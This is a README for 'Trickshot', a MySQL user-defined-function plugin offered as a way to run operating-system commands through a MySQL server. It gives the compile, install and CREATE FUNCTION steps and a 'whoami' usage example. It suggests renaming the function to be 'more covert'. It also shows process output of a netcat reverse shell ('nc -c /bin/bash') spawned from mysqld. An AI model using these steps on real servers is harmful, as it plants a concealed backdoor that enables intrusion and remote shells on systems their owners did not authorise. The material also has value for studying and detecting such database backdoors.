# Trickshot
A MYSQL plugin that allows RCE through the MYSQL Server

# Installation
To install this lovely plugin first you must first compile it to a shared object like below.

```
gcc -I/usr/include/mysql -shared -fPIC -o tg.so trickshot.c
```

Then you must copy the `.so` file to the MYSQL plugin directory like so:

```
cp -f tg.so /usr/lib64/mysql/plugin/
```

Then remove into your MYSQL server and run the following query:

```
CREATE FUNCTION trickshot RETURNS STRING SONAME "tg.so";
```

Note: the `trickshot` portion of the MYSQL command can be swapped out to be more covert. The plugin is now installed.

# Usage
To use this plugin simply run the `trickshot` function inside a MYSQL query. An example is shown below.

```
MariaDB [(none)]> select trickshot("whoami");
+---------------------+
| trickshot("whoami") |
+---------------------+
| mysql               |
+---------------------+
1 row in set (0.04 sec)
```

For those curious, if one were to setup a reverse shell from this exploit and a blue team member ran `ps -fax` then they would see something like the following output while the shell was active.

```
 22077 ?        Ss     0:00 /bin/sh /usr/bin/mysqld_safe --basedir=/usr
 83370 ?        Sl     0:00  \_ /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --log-error=/var/log/mariadb/mariadb.log --pid-file=/var
 83526 ?        S      0:00      \_ sh -c nc -c /bin/bash localhost 4444 2>&1
 83527 ?        S      0:00          \_ nc -c /bin/bash localhost 4444
 83528 ?        S      0:00              \_ /bin/bash
```

# Resources
[The official MYSQL UDF References](https://dev.mysql.com/doc/refman/8.0/en/adding-udf.html)
